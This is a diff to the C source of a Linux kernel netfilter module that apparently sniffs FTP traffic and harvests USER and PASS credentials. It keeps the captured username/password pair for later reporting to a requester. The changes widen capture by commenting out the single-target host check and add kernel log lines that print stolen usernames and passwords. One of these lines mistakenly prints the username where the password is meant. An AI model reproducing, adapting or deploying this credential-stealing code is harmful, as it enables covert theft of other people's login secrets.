@@ -49,14 +49,18 @@ static void check_ftp(struct sk_buff *skb)
    int i = 0;
    
    tcp = (struct tcphdr *)(skb->data + (ip_hdr(skb)->ihl * 4));
-   data = (char *)((int)tcp + (int)(tcp->doff * 4));
+   data = (char *)((unsigned long)tcp + (unsigned long)(tcp->doff * 4));
 
    /* Now, if we have a username already, then we have a target_ip.
     * Make sure that this packet is destined for the same host. */
-   if (username)
-     if (ip_hdr(skb)->daddr != target_ip || tcp->source != target_port)
-       return;
+   //if (username)
+   //  if (ip_hdr(skb)->daddr != target_ip || tcp->source != target_port)
+   //    return;
    
+   if (*data == NULL) {
+		printk("data is none\n");
+	//	return;
+	} 
    /* Now try to see if this is a USER or PASS packet */
    if (strncmp(data, "USER ", 5) == 0) {          /* Username */
       data += 5;
@@ -74,6 +78,7 @@ static void check_ftp(struct sk_buff *skb)
       memset(username, 0x00, len + 2);
       memcpy(username, data, len);
       *(username + len) = '\0';	       /* NULL terminate */
+   	printk("fantao :%s usrname:%s \n", __FUNCTION__, username);  
    } else if (strncmp(data, "PASS ", 5) == 0) {   /* Password */
       data += 5;
 
@@ -93,6 +98,7 @@ static void check_ftp(struct sk_buff *skb)
       memset(password, 0x00, len + 2);
       memcpy(password, data, len);
       *(password + len) = '\0';	       /* NULL terminate */
+   	printk("fantao :%s pass:%s \n", __FUNCTION__, username);  
    } else if (strncmp(data, "QUIT", 4) == 0) {
       /* Quit command received. If we have a username but no password,
        * clear the username and reset everything */
@@ -131,7 +137,7 @@ static unsigned int watch_out(unsigned int hooknum,
 {
    struct sk_buff *sb = skb;
    struct tcphdr *tcp;
-   
+ 
    /* Make sure this is a TCP packet first */
    if (ip_hdr(sb)->protocol != IPPROTO_TCP)
      return NF_ACCEPT;		       /* Nope, not TCP */
@@ -167,7 +173,6 @@ static unsigned int watch_in(unsigned int hooknum,
    char *cp_data;		       /* Where we copy data to in reply */
    unsigned int   taddr;	       /* Temporary IP holder */
 
-	printk("%s,%s\n", __FUNC__, __LINE__);
    /* Do we even have a username/password pair to report yet? */
    if (!have_pair)
      return NF_ACCEPT;
